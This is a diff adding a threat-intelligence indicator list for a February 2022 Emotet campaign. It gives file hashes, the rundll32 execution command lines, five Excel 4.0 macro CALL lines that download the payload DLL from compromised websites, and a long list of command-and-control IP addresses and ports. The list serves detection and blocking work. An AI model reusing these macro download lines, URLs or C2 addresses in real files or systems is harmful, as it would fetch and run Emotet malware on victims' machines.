@@ -1,0 +1,76 @@
+Emotet 2022 - 04.02.2022 - epoch4
+
+************************************************************************************************************
+
+.xls 81bdf1ecf3b3db164fc52bbc64118e57f7cb02db7ada35c94fa5a85602d08c08
+
+.dll db3cfb7704ceab6b591117a3ee66d85307870866ab44b9825542a41bd9c57708
+
+EXCEL.EXE" /dde C:\Users\Admin\AppData\Local\Temp\Invoice.xls
+
+C:\Windows\SysWow64\rundll32.exe ..\wlw.ocx,D"&"l"&"lR"&"e"&"gister"&"Serve"&"r
+
+C:\Windows\SysWOW64\rundll32.exe "C:\Users\Admin\wlw.ocx",DllRegisterServer
+
+C:\Windows\SysWOW64\rundll32.exe "C:\Windows\SysWOW64\Rbhperfghjq\mteekk.jdv",UAStIhksoxJVnhD
+
+C:\Windows\SysWOW64\rundll32.exe "C:\Windows\SysWOW64\Rbhperfghjq\mteekk.jdv",DllRegisterServer
+
+.dll distro
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://terrassa-cafe.com/9yjxnes/18p2S7bBrdpM6FrAc/", "..\wlw.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://moseletronicos.com/wp-content/5/", "..\wlw.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://sabaithaimassage.com.au/wp-admin/Hgbn3e/", "..\wlw.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://wiremax.avaspadan.com/admin/ItopibIZF3dxpy0/", "..\wlw.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://troopsites.com/wp-admin/CzMJm2vfbA4osSHH/", "..\wlw.ocx")
+
+c2's
+
+192.254.71.210:443
+23.246.204.126:443
+164.68.99.3:8080
+144.76.186.49:8080
+192.95.56.148:8080
+79.172.212.216:8080
+162.214.50.39:7080
+81.0.236.90:443
+159.89.230.105:443
+45.176.232.124:443
+212.24.98.99:8080
+185.157.82.211:8080
+159.8.59.82:8080
+45.118.135.203:7080
+51.254.140.238:7080
+144.76.186.55:7080
+46.55.222.11:443
+212.237.56.116:7080
+58.227.42.236:80
+162.243.175.63:443
+200.17.134.35:7080
+216.158.226.206:443
+173.212.193.249:8080
+103.75.201.4:443
+207.38.84.195:8080
+45.118.115.99:8080
+82.165.152.127:8080
+178.128.83.165:80
+110.232.117.186:8080
+50.116.54.215:443
+103.75.201.2:443
+212.237.5.209:443
+119.235.255.201:8080
+129.232.188.93:443
+160.16.102.168:80
+176.104.106.96:8080
+131.100.24.231:80
+158.69.222.101:443
+104.251.214.46:8080
+45.142.114.231:8080
+217.182.143.207:443
+41.76.108.46:8080
+212.237.17.99:8080
+107.182.225.142:8080
+203.114.109.124:443
+138.185.72.26:8080
+178.79.147.66:8080
+195.154.133.20:443
